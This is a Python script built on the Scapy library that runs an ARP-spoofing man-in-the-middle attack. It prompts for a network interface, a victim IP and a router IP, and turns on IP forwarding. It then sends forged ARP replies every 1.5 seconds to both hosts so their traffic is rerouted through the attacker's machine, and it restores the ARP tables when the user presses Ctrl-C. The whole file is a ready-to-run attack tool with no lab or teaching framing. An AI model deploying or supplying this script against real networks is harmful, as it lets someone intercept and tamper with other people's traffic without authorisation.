from scapy.all import *
import os
import time
import sys


def get_info():
    # Get user input for interface, destination IP, and router IP
    interface = input("Interface (ifconfig/ipconfig to see): ")
    destination_ip = input("Destination IP: ")
    router_ip = input("Router IP: ")
    return [interface, destination_ip, router_ip]


def get_mac(ip, interface):
    answer, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=5, iface=interface)
    
    # Extract and return the MAC address from the response
    for send, receive in answer:
        return receive.sprintf(r"%Ether.src%")


def re_arp(destination_ip, router_ip, interface):
    destination_mac = get_mac(destination_ip, interface)
    router_mac = get_mac(router_ip, interface)

    # Send ARP responses to restore ARP table entries
    send(ARP(op=2, pdst=router_ip, psrc=destination_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=destination_mac, iface=interface, iface_hint=destination_ip, retry=9))
    send(ARP(op=2, pdst=destination_ip, psrc=router_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=router_mac, retry=9))


    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


def attack(destination_ip, destination_mac, router_ip, router_mac):
    # Send forged ARP packets to perform the MITM attack
    send(ARP(op=2, pdst=destination_ip, psrc=router_ip, hwdst=destination_mac))
    send(ARP(op=1, pdst=router_ip, psrc=destination_ip, hwdst=router_mac))


def mitm():
    
    info = get_info()
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    try:
        destination_mac = get_mac(info[1], info[0])
    except Exception:
       
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        sys.exit(1)

    try:
        router_mac = get_mac(info[2], info[0])
    except Exception:
        
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        sys.exit(1)

   
    print("Destination MAC: %s" % destination_mac)
    print("Router MAC: %s" % router_mac)

    while True:
        try:
           
            attack(info[1], destination_mac, info[2], router_mac)
            time.sleep(1.5)
        except KeyboardInterrupt:
            
            re_arp(info[1], info[2], info[0])
            break

    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    sys.exit(1)


# Run the MITM attack
mitm()
